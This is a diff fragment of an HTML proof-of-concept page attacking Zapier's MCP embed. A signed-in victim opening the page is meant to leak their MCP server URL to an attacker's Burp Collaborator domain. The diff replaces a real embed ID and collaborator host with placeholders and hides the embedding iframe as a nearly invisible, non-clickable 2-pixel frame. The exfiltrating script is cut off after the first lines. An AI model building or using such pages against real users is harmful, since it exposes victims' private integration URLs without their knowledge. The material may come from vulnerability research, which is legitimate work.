@@ -5,13 +5,15 @@
 <p>Open this page while signed in to Zapier as the victim. Do not click inside the embed.</p>
 <pre id="status">Waiting for the embed to disclose the victim MCP server URL...</pre>
 <iframe
-  src="https://mcp.zapier.com/embed?embedId=96e091d4-559c-4bcd-baff-c1b9cfcec23b"
-  width="640"
-  height="420"
-  style="border:1px solid #ccc"
+  src="https://mcp.zapier.com/embed?embedId=REPLACE_WITH_ATTACKER_EMBED_ID"
+  width="2"
+  height="2"
+  aria-hidden="true"
+  tabindex="-1"
+  style="position:fixed;right:0;bottom:0;width:2px;height:2px;border:0;opacity:0.01;pointer-events:none"
 ></iframe>
 <script>
-const COLLABORATOR = 'lh6c3n0r0o10f21utltpbwsodfj67wvl.oastify.com';
+const COLLABORATOR = 'REPLACE_WITH_BURP_COLLABORATOR_DOMAIN';
 const status = document.getElementById('status');
 let sent = false;
 
